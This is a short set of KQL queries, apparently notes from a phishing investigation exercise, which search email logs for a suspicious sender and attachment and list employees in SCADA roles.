Email
| where sender contains "thresher_libero@hotmail.com" //subject [EXTERNAL] Critical: Severe Security Breach Detected - Immediate Action Required

Email 
| where link contains "Urgent_Cyber_Threat_Alert.zip"


Employees
| where role contains "scada"
| project username, role, hostname, name // waho, Waymon Ho SCADA Administrator NYWC-MACHINE, jisaetang Jibby Saetang BDC0-DESKTOP SCADA Operator

//employe distinc role
Employees
| distinct role

Email
| where recipient  contains "sarah"


